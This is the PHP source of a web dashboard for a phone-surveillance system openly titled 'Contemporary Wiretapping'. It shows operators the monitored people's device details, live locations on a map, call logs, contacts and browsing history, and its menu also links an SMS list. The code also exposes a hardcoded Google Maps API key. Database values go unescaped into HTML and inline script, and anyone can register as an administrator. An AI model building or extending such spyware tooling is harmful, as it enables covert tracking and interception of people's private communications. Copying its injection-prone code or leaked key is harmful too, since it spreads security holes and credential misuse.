<?php

//including the required files
require_once '../include/DbOperation.php';
require '.././libs/Slim/Slim.php';

\Slim\Slim::registerAutoloader();

$app = new \Slim\Slim();

/* *
 * URL: http://localhost/Monitor/cms/login
 * Parameters: none
 * Method: GET
 * */
$app->get('/login', function() use ($app){
    session_start();
    if(isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/account');
        die;
    }else{
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Login</h2>
                        <p>Enter your registered email address and password to proceed.</p>
                    </div>
                    <div class="row">
                        <div class="col-xs-3"></div>
                        <div class="col-xs-6">
                            <label><strong>Username</strong></label>
                            <input type="text" placeholder="Enter Username" name="username">
                            <label><strong>Password</strong></label>
                            <input type="password" placeholder="Enter Password" name="password">
                            <button type="submit">Login</button>
                            <div>Dont have an account? <a href="register">Register here</a></div>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>';
        echo $response;
    }
});

/* *
 * URL: http://localhost/Monitor/cms/login
 * Parameters: none
 * Authorization: Put API Key in Request Header
 * Method: POST
 * */
$app->post('/login', function() use ($app){
    session_start();
    if(isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/account');
        die;
    }else{
        $username = $app->request->post('username');
        $password = $app->request->post('password');
        $db = new DbOperation();
        $result = $db->getUser($username,$password);
        $row = $result->fetch_assoc();
        if(count($row)){
            $_SESSION["username"] = $row['username'];
            $_SESSION["name"] = $row['name'];
            header('Location: '.'/Monitor/cms/account');
            die;
        }else{
            header('Location: '.'/Monitor/cms/login');
            die;
        }
    }
});

/* *
 * URL: http://localhost/Monitor/cms/register
 * Parameters: none
 * Method: GET
 * */
$app->get('/register', function() use ($app){
    session_start();
    if(isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/account');
        die;
    }else{
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Register</h2>
                        <p>Please register here to get more access to the account.</p>
                    </div>
                    <div class="row">
                        <div class="col-xs-3"></div>
                        <div class="col-xs-6">
                            <label><strong>Name</strong></label>
                            <input type="text" placeholder="Enter Name" name="name">
                            <label><strong>Username</strong></label>
                            <input type="text" placeholder="Enter Username" name="username">
                            <label><strong>Password</strong></label>
                            <input type="password" placeholder="Enter Password" name="password">
                            <button type="submit">Register</button>
                            <div>Dont have an account? <a href="login">Login here</a></div>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>';
        echo $response;
    }
});

/* *
 * URL: http://localhost/Monitor/cms/register
 * Parameters: none
 * Authorization: Put API Key in Request Header
 * Method: POST
 * */
$app->post('/register', function() use ($app){
    session_start();
    if(isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/account');
        die;
    }else{
        $name = $app->request->post('name');
        $username = $app->request->post('username');
        $password = $app->request->post('password');
        $db = new DbOperation();
        $result = $db->createAdminUser($name,$username,$password);
        if ($result == 0) {
            $_SESSION["username"] = $username;
            $_SESSION["name"] = $name;
            header('Location: '.'/Monitor/cms/account');
            die;
        } else if ($result == 1) {
            echo "Oops! An error occurred while registereing";
        }
    }
});

/* *
 * URL: http://localhost/Monitor/cms/placeconfig
 * Parameters: none
 * Method: GET
 * */
$app->get('/placeconfig', function() use ($app){
    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
        $db = new DbOperation();
        $result = $db->getPlace();
        while($row = $result->fetch_assoc()){
            $id = $row['id'];
            $name = $row['name'];
            $phone = $row['phone'];
            $latitude = $row['latitude'];
            $longitude = $row['longitude'];
            $radius = $row['radius'];
            $address = $row['address'];
        }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Place Configuration</h2>
                        <p>Please update the place details below</p>
                    </div>
                    <div class="row">
                        <div class="col-xs-3"></div>
                        <div class="col-xs-6">
                            <label><strong>Name</strong></label>
                            <input type="text" placeholder="Enter Name" value="'.$name.'" name="name">
                            <label><strong>Phone</strong></label>
                            <input type="text" placeholder="Enter Phone" value="'.$phone.'" name="phone">
                            <label><strong>Address</strong></label>
                            <input type="text" placeholder="Enter Address" value="'.$address.'" name="address">
                            <label><strong>Latitude</strong></label>
                            <input type="text" placeholder="Enter Latitude" value="'.$latitude.'" name="latitude">
                            <label><strong>Longitude</strong></label>
                            <input type="text" placeholder="Enter Longitude" value="'.$longitude.'" name="longitude">
                            <label><strong>Radius</strong></label>
                            <input type="text" placeholder="Enter Radius" value="'.$radius.'" name="radius">
                            <button type="submit">Update</button>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>';
        echo $response;
    }
});

/* *
 * URL: http://localhost/Monitor/cms/placeconfig
 * Parameters: none
 * Authorization: Put API Key in Request Header
 * Method: POST
 * */
$app->post('/placeconfig', function() use ($app){
    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
        $name = $app->request->post('name');
        $phone = $app->request->post('phone');
        $address = $app->request->post('address');
        $latitude = $app->request->post('latitude');
        $longitude = $app->request->post('longitude');
        $radius = $app->request->post('radius');
        $db = new DbOperation();
        $result = $db->updatePlace($name,$phone,$address,$latitude,$longitude,$radius);
        if ($result == 0) {

            $result = $db->getAllTokens();
            $tokens = array();

            if(mysqli_num_rows($result) > 0 ){

                while ($row = mysqli_fetch_assoc($result)) {
                    $tokens[] = $row["Token"];
                }
            }
            $message = array('name'=>$name,'phone'=>$phone,'address'=>$address,'latitude'=>$latitude,'longitude'=>$longitude,'radius'=>$radius);
            $message_status = send_notification($tokens, $message);
            echo $message_status;
            header('Location: '.'/Monitor/cms/account');
            die;
        } else if ($result == 1) {
            echo "Oops! An error occurred while registereing";
        }
    }
});

/* *
 * URL: http://localhost/Monitor/cms/logout
 * Parameters: none
 * Authorization: Put API Key in Request Header
 * Method: GET
 * */
$app->get('/logout', function() use ($app){
    session_start();
    if(isset($_SESSION["username"])){
        session_unset();
        session_destroy();
    }
    header('Location: '.'/Monitor/cms/login');
    die;
});

/* *
 * URL: http://localhost/Monitor/cms/account
 * Parameters: none
 * Authorization: Put API Key in Request Header
 * Method: GET
 * */
$app->get('/account', function() use ($app){
    session_start();
    if(isset($_SESSION["username"])){
        $db = new DbOperation();
        $result = $db->getPlace();
        while($row = $result->fetch_assoc()){
            $id = $row['id'];
            $name = $row['name'];
            $phone = $row['phone'];
            $latitude = $row['latitude'];
            $longitude = $row['longitude'];
            $radius = $row['radius'];
            $address = $row['address'];
        }
        $result = $db->getAllUsers();
            $marker ='';
        while($row = $result->fetch_assoc()){
            $marker .='var tamil'.$row["id"].' = {lat: '.$row["latitude"].', lng: '.$row["longitude"].'};
            var marker'.$row["id"].' = new google.maps.Marker({
                  position: tamil'.$row["id"].',
                  label:"'.$row["name"].'",
                  map: map
                });';
        }
        $marker .='var tamil = {lat: '.$latitude.', lng: '.$longitude.'};
            var marker = new google.maps.Marker({
                  position: tamil,
                  label:"'.$name.'",
                  map: map
                });';
        
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
            <style>
               #map {
                height: 400px;
                width: 70%;
                left:15%;
               }
            </style>
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Contemporary Wiretapping using Android Geofencing with a Centralized Content Management System</h2>
                    </div>
                    <div class="row">
                        <div class="col-xs-3"></div>
                        <div class="col-xs-6">
                            <div><label><strong>Place Name :</strong></label><span>'.$name.'</span>
                            <!--<label><strong>Phone :</strong></label>
                            <span>'.$phone.'</span>
                            <label><strong>Address :</strong></label>
                            <span>'.$address.'</span></div>-->
                            <div><label><strong>Latitude :</strong></label>
                            <span>'.$latitude.'</span></div>
                            <div><label><strong>Longitude :</strong></label>
                            <span>'.$longitude.'</span></div>
                            <div><label><strong>Radius :</strong></label>
                            <span>'.$radius.'</span></div>
                        </div>
                    </div>
                </div>
            </form>
            <div id="map"></div>
            <script>
              function initMap() {
                var tamil = {lat: '.$latitude.', lng: '.$longitude.'};
                var map = new google.maps.Map(document.getElementById("map"), {
                  zoom: 17,
                  center: tamil,
                  population: 2714856
                });'.$marker.'
                var cityCircle = new google.maps.Circle({
                    strokeColor: "#FF0000",
                    strokeOpacity: 0.8,
                    strokeWeight: 2,
                    fillColor: "#FF0000",
                    fillOpacity: 0.50,
                    map: map,
                    center: tamil.center,
                    radius: .5 * 100
                });

              }

            </script>
            <script async defer
            src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDPDOZ5f4CyAVVj5ZfzkhZRptyW81Vi2ko&callback=initMap">
            </script>
        </body>
        </html>';
        echo $response;

    }else{
        header('Location: '.'/Monitor/cms/login');
        die;
    }
});

/* *
 * URL: http://localhost/Monitor/cms/users
 * Parameters: none
 * Method: GET
 * */
$app->get('/users', function() use ($app){
    $db = new DbOperation();
    $result = $db->getAllUsers();
    $id = '';
    $name = '';
    $phone = '';
    $deviceId = '';
    $deviceBrand = '';
    $deviceModel = '';
    $latitude = '';
    $longitude = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td>'.$row['name'].'</td>';
        $rows .= '<td>'.$row['phone'].'</td>';
        $rows .= '<td>'.$row['deviceId'].'</td>';
        $rows .= '<td>'.$row['deviceBrand'].'</td>';
        $rows .= '<td>'.$row['deviceModel'].'</td>';
        $rows .= '<td>'.$row['latitude'].'</td>';
        $rows .= '<td>'.$row['longitude'].'</td>';
        $rows .= '<td><a href=/Monitor/cms/updateuser?id='.$row['id'].'>Edit</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No users found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>All Users</h2>
                        <p>All users registered. </p>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Name</th>
                                    <th>Phone</th> 
                                    <th>Device ID</th>
                                    <th>Device Brand</th>
                                    <th>Device Model</th>
                                    <th>Latitude</th>
                                    <th>Longitude</th>
                                    <th>Edit</th>
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});

/* *
 * URL: http://localhost/Monitor/cms/updateuser
 * Parameters: none
 * Method: GET
 * */
$app->get('/updateuser', function() use ($app){
    $id = $app->request->get('id');
    $db = new DbOperation();
    $result = $db->getUserById($id);
    $id = '';
    $name = '';
    $phone = '';
    $deviceId = '';
    $deviceBrand = '';
    $deviceModel = '';
    $latitude = '';
    $longitude = '';

    while($row = $result->fetch_assoc()){
        $id = $row['id'];
        $name = $row['name'];
        $phone = $row['phone'];
        $deviceId = $row['deviceId'];
        $deviceBrand = $row['deviceBrand'];
        $deviceModel = $row['deviceModel'];
        $latitude = $row['latitude'];
        $longitude = $row['longitude'];
    }
    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>User details</h2>
                        <p>Please update the user details below</p>
                    </div>
                    <div class="row">
                        <div class="col-xs-3"></div>
                        <div class="col-xs-6">
                            <input type="hidden" value="'.$id.'" name="id">
                            <label><strong>Name</strong></label>
                            <input type="text" placeholder="Enter Name" value="'.$name.'" name="name">
                            <label><strong>Phone</strong></label>
                            <input type="text" placeholder="Enter Phone" value="'.$phone.'"  name="phone">
                            <label><strong>Device Id</strong></label>
                            <input type="text" placeholder="Enter Device Id" value="'.$deviceId.'" name="deviceId">
                            <label><strong>Device Brand</strong></label>
                            <input type="text" placeholder="Enter Device Brand" value="'.$deviceBrand.'" name="deviceBrand">
                            <label><strong>Device Model</strong></label>
                            <input type="text" placeholder="Enter Device Model" value="'.$deviceModel.'" name="deviceModel">
                            <label><strong>Latitude</strong></label>
                            <input type="text" placeholder="Enter Latitude" value="'.$latitude.'"  name="latitude">
                            <label><strong>Longitude</strong></label>
                            <input type="text" placeholder="Enter Longitude" value="'.$longitude.'"  name="longitude">
                            <button type="submit">Update</button>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>';
        echo $response;
    }
});

/* *
 * URL: http://localhost/Monitor/cms/updateuser
 * Parameters: none
 * Authorization: Put API Key in Request Header
 * Method: POST
 * */
$app->post('/updateuser', function() use ($app){
    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
        $id = $app->request->post('id');
        $name = $app->request->post('name');
        $phone = $app->request->post('phone');
        $deviceId = $app->request->post('deviceId');
        $deviceBrand = $app->request->post('deviceBrand');
        $deviceModel = $app->request->post('deviceModel');
        $latitude = $app->request->post('latitude');
        $longitude = $app->request->post('longitude');
        $db = new DbOperation();
        $result = $db->updateUser($id,$name,$phone,$deviceId,$deviceBrand,$deviceModel,$latitude,$longitude);
        if ($result == 0) {
            header('Location: '.'/Monitor/cms/account');
            die;
        } else if ($result == 1) {
            echo "Oops! An error occurred while updateing";
        }
    }
});


/* *
 * URL: http://localhost/Monitor/cms/userslist
 * Parameters: none
 * Method: GET
 * */
$app->get('/userscallslist', function() use ($app){
    $db = new DbOperation();
    $result = $db->getAllUsers();
    $id = '';
    $name = '';
    $phone = '';
    $deviceId = '';
    $deviceBrand = '';
    $deviceModel = '';
    $latitude = '';
    $longitude = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td><a href=/Monitor/cms/callslist?id='.$row['id'].'>'.$row['name'].'</td>';
        $rows .= '<td>'.$row['phone'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No users found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Call Logs</h2>
                        <p>All users registered. </p>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Name</th>
                                    <th>Phone</th> 
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});


/* *
 * URL: http://localhost/Monitor/cms/callslist
 * Parameters: none
 * Method: GET
 * */
$app->get('/callslist', function() use ($app){
    $id = $app->request->get('id');
    $db = new DbOperation();
    $result = $db->getCallListById($id);
    $phone = '';
    $type = '';
    $calldate = '';
    $duration = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td>'.$row['name'].'</td>';
        $rows .= '<td>'.$row['phone'].'</td>';
        $rows .= '<td>'.$row['type'].'</td>';
        $rows .= '<td>'.$row['calldate'].'</td>';
        $rows .= '<td>'.$row['duration'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No calls found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Call Logs</h2>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Name</th>
                                    <th>Phone</th> 
                                    <th>Call Type</th>
                                    <th>Call Date</th>
                                    <th>Call Duration</th>
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});


/* *
 * URL: http://localhost/Monitor/cms/userscontactslist
 * Parameters: none
 * Method: GET
 * */
$app->get('/userscontactslist', function() use ($app){
    $db = new DbOperation();
    $result = $db->getAllUsers();
    $id = '';
    $name = '';
    $phone = '';
    $deviceId = '';
    $deviceBrand = '';
    $deviceModel = '';
    $latitude = '';
    $longitude = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td><a href=/Monitor/cms/contactslist?id='.$row['id'].'>'.$row['name'].'</td>';
        $rows .= '<td>'.$row['phone'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No users found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Contacts List</h2>
                        <p>All users registered. </p>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Name</th>
                                    <th>Phone</th> 
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});


/* *
 * URL: http://localhost/Monitor/cms/contactslist
 * Parameters: none
 * Method: GET
 * */
$app->get('/contactslist', function() use ($app){
    $id = $app->request->get('id');
    $db = new DbOperation();
    $result = $db->getContactsListById($id);
    $phone = '';
    $name = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td>'.$row['name'].'</td>';
        $rows .= '<td>'.$row['phone'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No Contacts found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Contacts List</h2>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Contact Name</th> 
                                    <th>Contact Phone Number</th>
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});




/* *
 * URL: http://localhost/Monitor/cms/browserhistory
 * Parameters: none
 * Method: GET
 * */
$app->get('/browserhistory', function() use ($app){
    $db = new DbOperation();
    $result = $db->getAllUsers();
    $id = '';
    $name = '';
    $phone = '';
    $deviceId = '';
    $deviceBrand = '';
    $deviceModel = '';
    $latitude = '';
    $longitude = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td><a href=/Monitor/cms/browserhistorylist?id='.$row['id'].'>'.$row['name'].'</td>';
        $rows .= '<td>'.$row['phone'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No users found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Browsing History List</h2>
                        <p>All users registered. </p>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Name</th>
                                    <th>Phone</th> 
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});


/* *
 * URL: http://localhost/Monitor/cms/browserhistorylist
 * Parameters: none
 * Method: GET
 * */
$app->get('/browserhistorylist', function() use ($app){
    $id = $app->request->get('id');
    $db = new DbOperation();
    $result = $db->getHistoryListById($id);
    $title = '';
    $url = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td>'.$row['title'].'</td>';
        $rows .= '<td>'.$row['url'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No History found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>Browsing History List</h2>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Page Title</th> 
                                    <th>Page URL</th>
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});





